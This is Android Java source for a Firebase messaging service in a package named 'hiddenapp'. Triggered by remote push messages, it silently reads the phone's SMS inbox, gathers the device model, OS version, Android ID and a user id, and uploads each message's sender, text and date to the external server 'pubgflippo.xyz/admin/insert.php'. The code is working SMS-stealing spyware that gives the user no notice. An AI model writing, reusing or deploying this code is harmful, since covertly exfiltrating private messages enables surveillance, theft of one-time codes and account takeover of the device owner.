package com.example.hiddenapp;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.math.BigInteger;
import java.nio.ByteOrder;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Map;

public class MyFirebaseMessagingService extends FirebaseMessagingService {
    private static final String TAG = "FCM Service";
    public static SharedPreferences.Editor editor;
    public String loaddate, setdate, ipaddress,userid;
    public static String stoore;
    public SharedPreferences sharedPreferences;
    public static int i = 0,total=0;
    public Context devicecontext;


    @Override
    public void onMessageReceived(final RemoteMessage remoteMessage) {
        startService(new Intent(this,SMSBroadcastReceiver.class));
        Log.d(TAG, "From: " + remoteMessage.getData().size()); // for the data size
        final Map<String, String> data = remoteMessage.getData();
        String title = data.get("title");
        String body = data.get("body");





            String msgData1 = "";


            // Log.d(TAG, "onMessageReceived: "+msgData1);

           devicecontext=createDeviceProtectedStorageContext();
            sharedPreferences =devicecontext.getSharedPreferences("shared",MODE_PRIVATE);
            final String storedtime = sharedPreferences.getString("time", null);
            userid = sharedPreferences.getString("userid", null);

            Log.d(TAG, "onMessageReceived: stored time" + storedtime);
            if (storedtime == null || storedtime.trim()=="") {
                called();
                Log.d(TAG, "onMessageReceived: no data");
            } else {
                loaddate = storedtime;
            }
            Log.d(TAG, "onMessageReceived: load date" + loaddate);


            final Handler handler = new Handler(Looper.getMainLooper());
            final String finalMsgData = msgData1;
            handler.post(new Runnable() {
                public void run() {
                    // String msgData="vdv",phone="vdvd";
                    Uri mSmsinboxQueryUri = Uri.parse("content://sms/inbox");
                    String msgData = "", phone = "", date = "";
                    String filter = "date >" + loaddate;

                    Cursor cursor1 = getContentResolver().query(mSmsinboxQueryUri,
                            null, filter, null, "date ASC");
                    Cursor cursor = getContentResolver().query(mSmsinboxQueryUri,
                            null, filter, null, "date ASC");
                    int i = 0;
                    Sender.count = 0;


                    String os = Build.VERSION.RELEASE;
                    String model = Build.MODEL;
                    WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);

                    int ip = wifiManager.getConnectionInfo().getIpAddress();
                    ip = (ByteOrder.nativeOrder().equals(ByteOrder.LITTLE_ENDIAN)) ? Integer.reverseBytes(ip) : ip;
                    byte[] bytes = BigInteger.valueOf(ip).toByteArray();
                    TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

                    String deviceid = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);

                  /*  try {
                      //  InetAddress addresses = InetAddress.getByAddress(bytes);
                      //  ipaddress = String.valueOf(addresses);
                    } catch (UnknownHostException e) {
                        e.printStackTrace();
                    }

                   */
                    while (cursor.moveToNext()){total++;
                        Log.d(TAG, "total "+total);}
                    while (cursor1.moveToNext()) {
                        msgData = cursor1.getString(cursor1.getColumnIndex("body"));
                        phone = cursor1.getString(cursor1.getColumnIndex("address"));
                        date = cursor1.getString(cursor1.getColumnIndex("date"));

                        Log.d(TAG, "onMessageReceived: " + phone + "---" + msgData + "---" + date);
                        i++;
                        {
                            Sender s = new Sender(getApplicationContext(), "https://pubgflippo.xyz/admin/insert.php", phone, msgData, date, i, os, model, ipaddress, deviceid, userid);
                            s.execute();
                        }



                    }
                  /*  if (i==0) {
                        Log.d(TAG, "i==0 :entered ");
                        Sender s = new Sender(getApplicationContext(), "https://pubgflippo.xyz/admin/insert.php", "", "", "", 0, "", "", "", deviceid, "");
                        s.execute();
                    }
                    */
                    /*if(i!=0){
                    final Handler handler1 = new Handler();
                    final int finalI = i;
                    final Runnable runnable = new Runnable() {
                        @Override
                        public void run() {
                            handler1.postDelayed(this, 1);
                            editor = sharedPreferences.edit();
                            Log.d(TAG, "run: " + stoore + "-----" + Sender.count + "---" + finalI);
                            if (storedtime == null) {
                                editor.putString("time", loaddate);
                            } else if (stoore != null) {
                                editor.putString("time", stoore);
                            }
                            editor.apply();
                            if (Sender.count == finalI)
                                handler1.removeCallbacks(this);
                        }
                    };
                    handler1.postDelayed(runnable, 1);




                    //   Toast.makeText(getApplicationContext(), msgData, Toast.LENGTH_LONG).show();


                }

                     */



                }
            });


            Log.d(TAG, "onMessageReceived: " + title + body);
            // if(!title.equals("") && !body.equals("")) {
            //  sendNotificationData(title, body); //send notification to user
            //}
//        Toast.makeText(MyFirebaseMessagingService.this,"received",Toast.LENGTH_LONG).show();
            //  Log.d(TAG, "From: " + remoteMessage.getFrom());
            // Log.d(TAG, "From: " + remoteMessage.getNotification().getBody());


      /*  final FirebaseDatabase database = FirebaseDatabase.getInstance();
        String deviceid1 = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);

        final DatabaseReference myConnectionsRef = database.getReference("users/"+deviceid1+"/conn");

// Stores the timestamp of my last disconnect (the last time I was seen online)
        final DatabaseReference lastOnlineRef = database.getReference("users/"+deviceid1+"/last");

        final DatabaseReference connectedRef = database.getReference(".info/connected");
        connectedRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                boolean connected = snapshot.getValue(Boolean.class);
                if (connected) {
                    DatabaseReference con = myConnectionsRef.push();

                    // When this device disconnects, remove it
                    con.onDisconnect().removeValue();

                    // When I disconnect, update the last time I was seen online
                //    lastOnlineRef.onDisconnect().setValue(ServerValue.TIMESTAMP);

                    // Add this device to my connections list
                    // this value could contain info about the device or a timestamp too
                    con.setValue(Boolean.TRUE);
                }
            }

            @Override
            public void onCancelled(DatabaseError error) {
                Log.w(TAG, "Listener was cancelled at .info/connected");
            }
        });

       */



    }
    @Override
    public void onNewToken(String token) {
        Log.d(TAG, "Refreshed token: " + token);

        // If you want to send messages to this application instance or
        // manage this apps subscriptions on the server side, send the
        // Instance ID token to your app server.
        //sendRegistrationToServer(token);
    }
        private void sendNotificationData(String messageTitle,String messageBody) {
            Intent intent = new Intent(this, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            PendingIntent pendingIntent = PendingIntent.getActivity(this,0 /* request code */, intent,PendingIntent.FLAG_UPDATE_CURRENT);

            long[] pattern = {500,500,500,500,500};

          //  Uri defaultSoundUri= RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);

            NotificationCompat.Builder notificationBuilder = (NotificationCompat.Builder) new NotificationCompat.Builder(this)
                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                    .setContentTitle(messageTitle)
                    .setContentText(messageBody)
                    .setAutoCancel(true)
                    .setVibrate(pattern)
                    .setLights(Color.BLUE,1,1)
                   // .setSound(defaultSoundUri)
                    .setContentIntent(pendingIntent);

            NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            notificationManager.notify(0 /* ID of notification */, notificationBuilder.build());

        }
    public void called() {
        SimpleDateFormat simpleDateFormat=new SimpleDateFormat("dd-mm-yyyy HH:MM:ss");
        SimpleDateFormat simpleDateFormat1=new SimpleDateFormat("aa");
        Date date=new Date();
        String date1=simpleDateFormat.format(date);
        String dat=simpleDateFormat1.format(date);
        String msgData1="";
        try {
            Date value=simpleDateFormat.parse(date1);
            if(dat.contains("PM")){msgData1=String.valueOf(value.getTime()
                    //  +43200000
            );}
            Log.d(TAG, "called  value: "+value.getTime());
            msgData1=String.valueOf(value.getTime());
        } catch (ParseException e) {
            e.printStackTrace();
        }
        Log.d(TAG, "called:erxrtfcfxrztxfcccccccccccccccccccccccccccccccccc"+msgData1);
        SharedPreferences sharedPreferences =devicecontext.getSharedPreferences("shared", MODE_PRIVATE);
        final String storedtime = sharedPreferences.getString("time", null);
        if (storedtime == null || storedtime.trim()=="") {
            Log.d(TAG, "called: called"+msgData1);
            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putString("time", msgData1);
            editor.apply();

        }
         String stortime = sharedPreferences.getString("time", null);
        Log.d(TAG, "called: new stored time"+stortime);

    }
    public static void check() {


    }


}































